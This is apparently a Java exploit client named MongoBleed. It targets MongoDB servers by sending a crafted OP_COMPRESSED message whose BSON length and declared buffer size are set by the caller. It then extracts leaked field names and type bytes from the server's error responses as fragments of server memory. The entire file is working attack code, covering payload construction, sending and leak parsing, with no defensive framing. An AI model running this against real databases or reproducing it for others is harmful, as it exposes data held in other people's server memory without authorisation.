package com.j0lt.mongobleed;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.DataFormatException;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public final class MongoBleedClient {
    private static final byte[] BSON_CONTENT = new byte[] {
            0x10, 'a', 0x00, 0x01, 0x00, 0x00, 0x00
    };

    private static final Pattern FIELD_NAME_PATTERN = Pattern.compile("field name '([^']*)'");
    private static final Pattern TYPE_PATTERN = Pattern.compile("type (\\d+)");

    private MongoBleedClient() {
    }

    public static byte[] sendProbe(
            String host,
            int port,
            int docLen,
            int bufferSize,
            int timeoutMs,
            int maxResponseBytes
    ) throws IOException {
        byte[] bson = buildBson(docLen);
        byte[] opMsg = buildOpMsg(bson);
        byte[] compressed = compress(opMsg);
        byte[] payload = buildCompressedPayload(compressed, bufferSize);
        byte[] header = buildHeader(payload.length);

        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(host, port), timeoutMs);
            socket.setSoTimeout(timeoutMs);
            OutputStream out = socket.getOutputStream();
            out.write(header);
            out.write(payload);
            out.flush();

            InputStream in = socket.getInputStream();
            byte[] response = readMongoMessage(in, maxResponseBytes);
            return response == null ? new byte[0] : response;
        }
    }

    public static List<byte[]> extractLeaks(byte[] response, int maxInflateBytes) {
        if (response == null || response.length < 25) {
            return new ArrayList<>();
        }

        int msgLen = readInt32LE(response, 0);
        if (msgLen <= 0 || msgLen > response.length) {
            msgLen = response.length;
        }

        int opCode = readInt32LE(response, 12);
        byte[] raw;
        if (opCode == 2012 && msgLen >= 25) {
            int compressorId = response[24] & 0xFF;
            if (compressorId != 2) {
                return new ArrayList<>();
            }
            byte[] compressed = Arrays.copyOfRange(response, 25, msgLen);
            raw = inflate(compressed, maxInflateBytes);
            if (raw == null) {
                return new ArrayList<>();
            }
        } else {
            raw = Arrays.copyOfRange(response, 16, msgLen);
        }

        return parseLeaks(raw);
    }

    private static byte[] buildBson(int docLen) {
        ByteBuffer buffer = ByteBuffer.allocate(4 + BSON_CONTENT.length).order(ByteOrder.LITTLE_ENDIAN);
        buffer.putInt(docLen);
        buffer.put(BSON_CONTENT);
        return buffer.array();
    }

    private static byte[] buildOpMsg(byte[] bson) {
        ByteBuffer buffer = ByteBuffer.allocate(4 + 1 + bson.length).order(ByteOrder.LITTLE_ENDIAN);
        buffer.putInt(0);
        buffer.put((byte) 0);
        buffer.put(bson);
        return buffer.array();
    }

    private static byte[] buildCompressedPayload(byte[] compressed, int bufferSize) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteBuffer header = ByteBuffer.allocate(9).order(ByteOrder.LITTLE_ENDIAN);
        header.putInt(2013);
        header.putInt(bufferSize);
        header.put((byte) 2);
        out.write(header.array(), 0, header.array().length);
        out.write(compressed, 0, compressed.length);
        return out.toByteArray();
    }

    private static byte[] buildHeader(int payloadLength) {
        ByteBuffer header = ByteBuffer.allocate(16).order(ByteOrder.LITTLE_ENDIAN);
        header.putInt(16 + payloadLength);
        header.putInt(1);
        header.putInt(0);
        header.putInt(2012);
        return header.array();
    }

    private static byte[] compress(byte[] input) {
        Deflater deflater = new Deflater();
        deflater.setInput(input);
        deflater.finish();
        byte[] buffer = new byte[1024];
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }

    private static byte[] inflate(byte[] input, int maxBytes) {
        Inflater inflater = new Inflater();
        inflater.setInput(input);
        byte[] buffer = new byte[4096];
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            while (!inflater.finished()) {
                int count = inflater.inflate(buffer);
                if (count == 0) {
                    if (inflater.needsInput() || inflater.needsDictionary()) {
                        break;
                    }
                }
                if (out.size() + count > maxBytes) {
                    int allowed = Math.max(0, maxBytes - out.size());
                    if (allowed > 0) {
                        out.write(buffer, 0, allowed);
                    }
                    break;
                }
                out.write(buffer, 0, count);
            }
        } catch (DataFormatException e) {
            return null;
        } finally {
            inflater.end();
        }
        return out.toByteArray();
    }

    private static byte[] readMongoMessage(InputStream in, int maxBytes) throws IOException {
        byte[] lenBuf = readFully(in, 4);
        if (lenBuf == null) {
            return null;
        }
        int msgLen = readInt32LE(lenBuf, 0);
        if (msgLen < 16 || msgLen > maxBytes) {
            return null;
        }
        byte[] rest = readFully(in, msgLen - 4);
        if (rest == null) {
            return null;
        }
        byte[] response = new byte[msgLen];
        System.arraycopy(lenBuf, 0, response, 0, lenBuf.length);
        System.arraycopy(rest, 0, response, lenBuf.length, rest.length);
        return response;
    }

    private static byte[] readFully(InputStream in, int len) throws IOException {
        byte[] buffer = new byte[len];
        int offset = 0;
        while (offset < len) {
            int read = in.read(buffer, offset, len - offset);
            if (read == -1) {
                return null;
            }
            offset += read;
        }
        return buffer;
    }

    private static int readInt32LE(byte[] data, int offset) {
        return (data[offset] & 0xFF) |
                ((data[offset + 1] & 0xFF) << 8) |
                ((data[offset + 2] & 0xFF) << 16) |
                ((data[offset + 3] & 0xFF) << 24);
    }

    private static List<byte[]> parseLeaks(byte[] raw) {
        List<byte[]> leaks = new ArrayList<>();
        if (raw == null || raw.length == 0) {
            return leaks;
        }

        String rawText = new String(raw, StandardCharsets.ISO_8859_1);
        Matcher fieldMatcher = FIELD_NAME_PATTERN.matcher(rawText);
        while (fieldMatcher.find()) {
            String fieldName = fieldMatcher.group(1);
            if (fieldName == null || fieldName.isEmpty()) {
                continue;
            }
            if ("?".equals(fieldName) || "a".equals(fieldName) || "$db".equals(fieldName) || "ping".equals(fieldName)) {
                continue;
            }
            leaks.add(fieldName.getBytes(StandardCharsets.ISO_8859_1));
        }

        Matcher typeMatcher = TYPE_PATTERN.matcher(rawText);
        while (typeMatcher.find()) {
            String typeValue = typeMatcher.group(1);
            try {
                int type = Integer.parseInt(typeValue);
                leaks.add(new byte[] { (byte) (type & 0xFF) });
            } catch (NumberFormatException ignored) {
            }
        }

        return leaks;
    }
}
